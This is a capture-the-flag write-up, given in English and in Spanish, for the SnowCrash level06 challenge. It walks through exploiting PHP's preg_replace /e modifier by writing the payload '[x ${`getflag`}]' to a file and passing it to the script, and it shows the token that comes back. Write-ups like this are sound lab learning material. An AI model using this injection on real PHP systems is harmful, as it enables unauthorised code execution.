### LEVEL06

- We have one .php script
    ```php
    level06@SnowCrash:~$ cat level06.php
    #!/usr/bin/php
    <?php
    function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
    function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
    $r = x($argv[1], $argv[2]); print $r;
    ?>
    ```
- The function `y($m)` performs a substitution of "." by " x " and "@" by " y"
- The fucntion `x($y, $z)`
    ```php
    function x($y, $z) {
    $a = file_get_contents($y); // Reads the content of the file specified in $y
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); // Performs substitutions using a regular expression
    $a = preg_replace("/\[/", "(", $a); // Substitutes brackets `[` for parentheses `(`
    $a = preg_replace("/\]/", ")", $a); // Substitutes brackets `]` for parentheses `)`
    return $a; // Returns the modified content of the file.
    }
    ```
- The attack vector is in the line `$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);` https://stackoverflow.com/questions/65024562/how-can-e-regex-expression-be-misused-on-a-php-code-snippet-running-on-my-ser/78247613#78247613
- The `/e` flag allows the regex to be executed as PHP code.
- We're going to attempt to inject `getflag`.
- We need a file for the script to read.
    1. It starts with `[x `
    1. Then the command we want to execute `... ${`getflag`}`
    1. And we close the bracket `]`
    ```bash
    echo '[x ${`getflag`}]' > /tmp/a
    ```
- We pass the file `/tmp/a` as a parameter to `level06`
    ```bash
    ./level06 /tmp/a
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    in /home/user/level06/level06.php(4) : regexp code on line 1
    ```

---

### LEVEL06

- Tenemos un script en .php
    ```php
    level06@SnowCrash:~$ cat level06.php
    #!/usr/bin/php
    <?php
    function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
    function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
    $r = x($argv[1], $argv[2]); print $r;
    ?>
    ```
- La funcion `y($m)` hace una sustitición de "." por " x " y "@" por " y"
- La fucnion `x($y, $z)`
    ```php
    function x($y, $z) {
    $a = file_get_contents($y); // Lee el contenido del archivo especificado en $y
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); // Realiza sustituciones usando una expresión regular
    $a = preg_replace("/\[/", "(", $a); // Sustituye los corchetes `[` por paréntesis `(`
    $a = preg_replace("/\]/", ")", $a); // Sustituye los corchetes `]` por paréntesis `)`
    return $a; // Retorna el contenido modificado del archivo
    }
    ```
- El vector de ataque está en la línea `$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);` https://stackoverflow.com/questions/65024562/how-can-e-regex-expression-be-misused-on-a-php-code-snippet-running-on-my-ser/78247613#78247613
- El `/e` permite que se ejecute la regex como código php
- Vamos a intentar inyectar el `getflag`
- Necesitamos un archivo para que lo lea el script
    1. Que empiece por `[x `
    1. Luego el comando que queremos ejecutar `... ${`getflag`}`
    1. Y cerramos corchete `]`
    ```bash
    echo '[x ${`getflag`}]' > /tmp/a
    ```
- Le pasamos al `level06` como parametro el archivo `/tmp/a`
    ```bash
    ./level06 /tmp/a
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
    in /home/user/level06/level06.php(4) : regexp code on line 1
    ```
